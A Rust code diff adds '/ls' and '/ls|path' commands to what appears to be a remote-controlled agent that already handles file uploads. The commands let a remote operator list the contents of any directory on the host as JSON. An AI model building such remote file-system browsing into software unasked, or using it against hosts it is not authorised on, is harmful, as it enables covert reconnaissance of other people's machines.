@@ -310,6 +310,68 @@ async fn main() {
                     return write_output;
                 }
 
+                if message.request == "/ls" {
+                    let agent_path= match env::current_exe() {
+                        Ok(agent_path) => agent_path,
+                        Err(e) => {
+                            debug_println!("error while getting agent's path: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    let dir = match agent_path.parent() {
+                        Some(dir) => dir,
+                        None => {
+                            return "couldd not extract agent's directory".to_string();
+                        },
+                    };
+
+                    let content = match helpers::get_directory_content(dir) {
+                        Ok(content) => content,
+                        Err(e) => {
+                            debug_println!("failed to get_directory_content: {}", e);
+                            return format!("failed to get_directory_content: {}", e);
+                        },
+                    };
+
+                    let json_content = match serde_json::to_string(&content) {
+                        Ok(j) => j,
+                        Err(e) => {
+                            debug_println!("error while converting dir content to json: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    return json_content;
+                }
+
+                if message.request.starts_with("/ls|") {
+                    let parts: Vec<&str> = message.request.split('|').collect();
+                    if parts.len() != 2 {
+                        return "command parsing failed".to_string();
+                    }
+
+                    let path = std::path::Path::new(parts[1]);
+
+                    let content = match helpers::get_directory_content(path) {
+                        Ok(content) => content,
+                        Err(e) => {
+                            debug_println!("failed to get_directory_content: {}", e);
+                            return format!("failed to get_directory_content: {}", e);
+                        },
+                    };
+
+                    let json_content = match serde_json::to_string(&content) {
+                        Ok(j) => j,
+                        Err(e) => {
+                            debug_println!("error while converting dir content to json: {}", e);
+                            return e.to_string();
+                        },
+                    };
+
+                    return json_content;
+                }
+
                 if message.request.starts_with("/upload-file|") {
                     match helpers::parse_upload_command(&message.request) {
                         Ok((file_path, file_id)) => {
